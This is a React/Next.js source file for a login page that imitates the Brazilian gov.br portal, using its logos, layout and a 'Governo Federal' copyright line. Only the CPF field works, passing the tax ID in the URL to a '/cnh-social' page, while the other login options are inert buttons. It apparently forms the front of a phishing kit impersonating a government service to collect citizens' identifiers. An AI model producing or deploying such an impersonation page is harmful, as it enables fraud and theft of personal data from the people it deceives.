"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { Building2, QrCode, Shield, ShieldCheck, HelpCircle } from "lucide-react"
import Link from "next/link"
import { useRouter } from "next/navigation"

export default function LoginPage() {
  const [cpf, setCpf] = useState("")
  const router = useRouter()

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value)
    if (formatted.length <= 14) {
      setCpf(formatted)
    }
  }

  const handleContinue = () => {
    if (cpf.length === 14) {
      // Navegar para a página CNH Social com o CPF
      const cpfNumbers = cpf.replace(/\D/g, "")
      router.push(`/cnh-social?cpf=${cpfNumbers}`)
    }
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <img src="/images/gov-br-logo.webp" alt="gov.br" className="h-8 w-auto" />
            </div>
            <div className="flex items-center space-x-4">
              <Button variant="ghost" size="sm" className="text-gray-600">
                Alto Contraste
              </Button>
              <Button variant="ghost" size="sm" className="text-gray-600">
                VLibras
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex items-center justify-center min-h-[calc(100vh-64px)] py-12 px-4">
        <Card className="w-full max-w-md">
          <CardContent className="p-8">
            <div className="mb-8">
              <h1 className="text-xl font-semibold text-gray-800 mb-6 text-left">Identifique-se no gov.br com:</h1>

              {/* CPF Section */}
              <div className="mb-6">
                <div className="flex items-center mb-3">
                  <img src="/images/id-card-icon.png" alt="CPF" className="w-5 h-5 mr-2" />
                  <span className="font-medium text-gray-700">Número do CPF</span>
                </div>
                <p className="text-sm text-gray-600 mb-4">
                  Digite seu CPF para <span className="text-[#1857b5] underline">criar</span> ou{" "}
                  <span className="text-[#1857b5] underline">acessar</span> sua conta gov.br
                </p>

                <div className="text-left mb-4">
                  <label htmlFor="cpf" className="block text-sm font-medium text-gray-700 mb-2">
                    CPF
                  </label>
                  <Input
                    id="cpf"
                    type="text"
                    value={cpf}
                    onChange={handleCPFChange}
                    placeholder="000.000.000-00"
                    className="w-full"
                    maxLength={14}
                  />
                </div>

                <Button
                  onClick={handleContinue}
                  className="w-full bg-[#1857b5] hover:bg-[#0f4389] text-white py-2 px-4 rounded-md"
                  disabled={cpf.length !== 14}
                >
                  Continuar
                </Button>
              </div>

              {/* Other Options */}
              <div className="border-t pt-6">
                <h2 className="text-sm font-medium text-gray-700 mb-4">Outras opções de identificação:</h2>

                <div className="space-y-2">
                  <Button variant="ghost" className="w-full justify-start text-left p-2 h-auto">
                    <Building2 className="w-5 h-5 text-green-600 mr-3" />
                    <span className="text-green-600">Login com o seu banco</span>
                  </Button>

                  <Button variant="ghost" className="w-full justify-start text-left p-2 h-auto">
                    <QrCode className="w-5 h-5 text-[#1857b5] mr-3" />
                    <span className="text-[#1857b5]">Login com QR code</span>
                  </Button>

                  <Button variant="ghost" className="w-full justify-start text-left p-2 h-auto">
                    <Shield className="w-5 h-5 text-[#1857b5] mr-3" />
                    <span className="text-[#1857b5]">Seu certificado digital</span>
                  </Button>

                  <Button variant="ghost" className="w-full justify-start text-left p-2 h-auto">
                    <ShieldCheck className="w-5 h-5 text-[#1857b5] mr-3" />
                    <span className="text-[#1857b5]">Seu certificado digital em nuvem</span>
                  </Button>
                </div>
              </div>

              {/* Help Section */}
              <div className="mt-8 pt-6 border-t">
                <Button variant="ghost" className="text-[#1857b5] text-sm">
                  <HelpCircle className="w-4 h-4 mr-2" />
                  Está com dúvidas e precisa de ajuda?
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-[#082041] border-t border-[#082041]">
        <div className="max-w-7xl mx-auto px-4 py-6">
          <div className="text-center mb-6">
            <img src="/images/logo-white.png" alt="gov.br" className="h-16 mx-auto" />
          </div>
          <div className="text-center">
            <Link href="#" className="text-white text-sm hover:underline mr-4">
              Termo de Uso e Aviso de Privacidade
            </Link>
          </div>
          <div className="text-center mt-2">
            <p className="text-xs text-gray-300">
              © 2025 <span className="font-semibold">Governo Federal</span>. Todos os direitos reservados.
            </p>
          </div>
        </div>
      </footer>
    </div>
  )
}
